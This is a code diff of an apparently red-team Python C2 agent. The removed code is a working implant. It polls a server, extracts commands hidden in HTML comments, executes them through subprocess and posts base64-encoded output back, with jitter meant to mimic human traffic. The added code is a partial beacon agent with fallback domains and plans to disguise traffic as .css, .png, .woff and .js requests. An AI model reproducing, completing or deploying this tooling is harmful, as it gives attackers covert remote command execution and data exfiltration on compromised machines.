@@ -1,249 +1,119 @@
-# Agent python file to be ran on a given agent (Currently designed to run on Linux)
-import math
-import base64
+# NOTE: This is a newer agent file to handle more advanced beacon and session communication
+# At some point the agent_html.py will be reintegrated in some form here
+import time
+import random
+from flask import request
 import requests
 import time
-import subprocess
-from bs4 import BeautifulSoup, Comment
-import uuid
-import argparse
-import random
-import sys
 
 
-class pythonAgent:
-    def __init__(self, domain, agentId, commEndPoint):
-        """Agent class:x
-        domain - domain that the agent references
-        endpoint - the given endpoint that a given agent references
+# Honestly probably the smart thing would be to just copy from what they have in sliver, as those are likely mapped to go use cases
+# For now though:
+
+# .css - Key exchange (to be implemented once we add encryption)
+# .png - close session messages
+# .woff - Gets information on a beacon request  
+# .js - session messages
+
+
+class Agent:
+    def __init__(self, domains: list[str], mode: str = "b"):
+        """Agent class:
+
+        Args:
+            domains - a list of domains that the agent can utilize for communication
+                    the first domain is the primary domain, and all others afterwards are backups
+
+            mode - sets the starting mode of the agent, either session or beacon based communication.
+                set to beacon by default
         """
 
-        self.domain = domain
-        self.agentId = agentId
-        self.commEndPoint = commEndPoint
+        self.domains = domains
+        self.mode = mode
+        self.stayAlive = True
+        self.activeDomain = domains[0]
 
-    def run(self):
-        """Runs the rest of the commands ot be able to execute on the server"""
-        # Text is parsed and commands are extracted
-        command_list = self._extract_html()
-        stdout = ""
-        # Commands are passed to be executed
-        if command_list:
-            stdout = self._execute_command(command_list)
-        else:
-            stdout = "NO COMMANDS DETECTED"
-        # Sends the outputs of the commands back to the webC2 server
-        self._send_results(stdout=stdout)
+        # NOTE: Other things that can be added here in the future
+        # encoders - the type of encoders that are used/available
+        # url params - different url paramters to obfuscate
 
-    def _make_request(self):
-        """
-        Makes a request to the currently set web server in self.domain
-        """
-        # requests.get extracts all of the web content that is given in the index.html file. Including comments
-        r = requests.get(self.domain)
+        # Timers that dictate the agents communication and timeouts
+        # Inspired by the timeouts that are used in MITRE Caldera
 
-        return r.text
+        self.beacon_inter = 60
 
-    def _extract_html(self):
-        """
-        Extracts given commands from the HTML including any updates to domain and more
-        """
-        text = self._make_request()
-        # FIX: It seems that that the text that is obtained from the pages are inconsistent sometimes, at times it gets the comments, at times it doesn't
-        # This is likely an error on the server side. But I am not entirely sure, as these are static files so we should be fine
-        # print(f"HTML TEXT: {text}")
+        # How long the agent waits for an unreachable server before terminating itself
+        # If there is a backup domain, the agent will switch to that domain
+        self.watchdog_timer = 7000
 
-        # Searches through all of the html comments on a given webpage
-        soup = BeautifulSoup(text, "html.parser")
-        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
+    def check_in(self): 
+        """Obtains any available commands if there are any, if no commands are available it fails"""
+        
+        # Generate a session 
+        self.session = requests.Session()
 
-        # Process each comment to eliminate whitespace and create lists delimited by spaces
-        processed_comments = []
+        #TODO: In the future, this request is going to require: encryption, nonce and obfuscation 
 
-        if comments:
-            for comment in comments:
-                # Strip whitespace and split into words (this removes \n and creates a list)
-                words = comment.strip().split()  # type: ignore
-                # We utilize extend here, as it takes the contents from words, and adds to process_comments
-                processed_comments.extend(words)
-
-            return processed_comments
-
-        return False
-
-    def _execute_command(self, command_list):
-        """
-        Executes commands (passed in as a parameter of a list) in order to run
-        """
-        result = None
         try:
-            """
-            Returns a CompletedProcess object with the following attributes: 
-            - .returncode
-            - .stdout 
-            - .stderr 
-            - .args 
-            """
+            response = self.session.get(f"http://{self.activeDomain}")
+            response.raise_for_status()
 
-            result = subprocess.run(
-                command_list,
-                capture_output=True,
-                text=True,
-                check=True,
-            )
-        except subprocess.CalledProcessError as e:
-            print(f"Command failed {e.stderr}")
+            #If there was no raise for status, then we know that there are commands 
+            
+
+
+        except requests.exceptions.Timeout: 
+            print("Request timed out")
+        except requests.exceptions.ConnectionError:
+            print("Connection error occurred")
+        except requests.exceptions.HTTPError as e:
+            print(f"HTTP error: {e}")
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
         except Exception as e:
-            print(f"Error: {e}")
+            print(f"Unexpected error: {e}")
+        
+        return None
+        
 
-        return result.stdout
+    def get_beacon_range(self, range: int = 10):
+        """Returns a range for the beacon as a tuple this is so it runs on a slight jitter
+        Args:
+            range - +- the interval set on initialization"""
 
-    def _send_results(self, stdout, chunks: bool = False):
-        """
-        Sends the results of a command back to the C2 server via a POST.
-        - stdout: the string output from the command (could be empty on error).
-        """
-        # Encode the stdout in base64 to be later decoded
-        # FIX:Pretty sure that I am not encoding here, please fix
-        b64_output = base64.b64encode(stdout.encode()).decode()
+        return (self.beacon_inter - range, self.beacon_inter + range)
 
-        # Generate a random uuid for the message id
-        message_id = str(uuid.uuid4())
+    def is_alive(self):
+        return self.stayAlive
 
-        # Set the endpoint that the json will communicate back to, this is determined by the agent compot
-        url = self.domain + self.commEndPoint
+    def kill(self):
+        self.stayAlive = False
 
-        session = requests.Session()
+    def is_beacon(self):
+        return self.mode == "b"
 
-        if chunks:
-            # Chunking the message out into smaller chunks that are then sent to the server and recomposed on that end
-            chunk_size = 20
-            total_len = len(b64_output)
-            chunk_count = math.ceil(total_len / chunk_size)
+    def _set_beacon(self):
+        self.mode = "b"
+        return
 
-            for i in range(chunk_count):
-                start = i * chunk_size
-                end = start + chunk_size
-                chunk = b64_output[start:end]
-
-                payload = {
-                    "timestamp": int(time.time()),  # epoch seconds
-                    "message_id": message_id,
-                    "agent_id": self.agentId,
-                    "chunk_index": i,
-                    "chunk_size": chunk_size,
-                    "chunk_count": chunk_count,
-                    "chunk_data": chunk,
-                }
-
-                # Attempt to send this using a HTML POSt and sending over the json
-                try:
-                    r = session.post(url, json=payload, timeout=5)
-                    r.raise_for_status()
-                    print(f"[+] Results successfully sent (status {r.status_code})")
-                except requests.RequestException as e:
-                    # TODO: Add more information to here in the event of a failure? Maybe a response back to the server?
-                    print(f"[-] Failed to send results: {e}")
-
-        # otherwsie send the entire message as a single payload:
-        payload = {
-            "timestamp": int(time.time()),  # epoch seconds
-            "message_id": message_id,
-            "agent_id": self.agentId,
-            "chunk_index": 0,
-            "chunk_size": len(b64_output),
-            "chunk_count": 1,
-            "chunk_data": b64_output,
-        }
-
-        try:
-            r = session.post(url, json=payload, timeout=5)
-            r.raise_for_status()
-            print(f"[+] Results successfully sent (status {r.status_code})")
-        except requests.RequestException as e:
-            # TODO: Add more information to here in the event of a failure? Maybe a response back to the server?
-            print(f"[-] Failed to send results: {e}")
+    def _set_session(self):
+        self.session = "s"
+        return
 
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="Python Agent for C2 Communication",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  python agent.py --domain http://127.0.0.1:5000 --endpoint /results
-  python agent.py -d https://example.com -e /api/results --min-interval 5 --max-interval 15
-        """,
-    )
-    parser.add_argument(
-        "--domain",
-        "-d",
-        required=True,
-        help="Domain URL for the C2 server (e.g., http://127.0.0.1:5000)",
-    )
-    parser.add_argument(
-        "--endpoint",
-        "-e",
-        required=True,
-        help="Endpoint path for communication (e.g., /results)",
-    )
-    parser.add_argument(
-        "--min-interval",
-        type=int,
-        default=5,
-        help="Minimum interval between runs in seconds (default: 5)",
-    )
-    parser.add_argument(
-        "--max-interval",
-        type=int,
-        default=10,
-        help="Maximum interval between runs in seconds (default: 30)",
-    )
+agent = Agent(domains=["localhost2.com"])
+while agent.is_alive():
+    # Beacon mode
+    if agent.is_beacon():
 
-    # Check the length of the inputted arguements to catch for potential erorrs
-    if len(sys.argv) == 1:
-        parser.print_help()
-        sys.exit(1)
+        # Send a check in request
 
-    # Obtain the args
-    args = parser.parse_args()
-
-    # If the min interval is set ot be higher than the max interval exit
-    if args.min_interval > args.max_interval:
-        print("Error: min-interval cannot be greater than max-interval")
-        sys.exit(1)
-
-    # Create agent with the given arguements
-    agent = pythonAgent(
-        domain=args.domain, commEndPoint=args.endpoint, agentId=str(uuid.uuid4())
-    )
-
-    # Print status statements in the terminal
-
-    print(f"[+] Agent started with ID: {agent.agentId}")
-    print(f"[+] Domain: {args.domain}")
-    print(f"[+] Endpoint: {args.endpoint}")
-    print(f"[+] Jitter range: {args.min_interval}-{args.max_interval} seconds")
-    print("[+] Starting continuous operation... (Press Ctrl+C to stop)")
-
-    # Loop that controls the agents requests on a timer jitter is utilized to attempt to mimic more "human" traffic conditions
-    while True:
-        try:
-            # Run the agent
-            agent.run()
-
-            # Calculate random jitter interval
-            jitter_interval = random.uniform(args.min_interval, args.max_interval)
-            print(f"[+] Sleeping for {jitter_interval:.2f} seconds...")
-
-            # Sleep for the jittered interval
-            time.sleep(jitter_interval)
-
-        except KeyboardInterrupt:
-            print("\n[!] Received interrupt signal. Shutting down agent...")
-            break
-        except Exception as e:
-            print(f"[-] Error occurred: {e}")
-            # A delay before an attempted restart
-            time.sleep(5)
-            continue
+        # Execute commands from that request if any 
+        
+        # Send results back 
+        
+        
+        # Agent goes to sleep  
+        sleep_range = agent.get_beacon_range()
+        sleep_interval = random.uniform(sleep_range[0], sleep_range[1])  # pyright: ignore[]
+        time.sleep(sleep_interval)
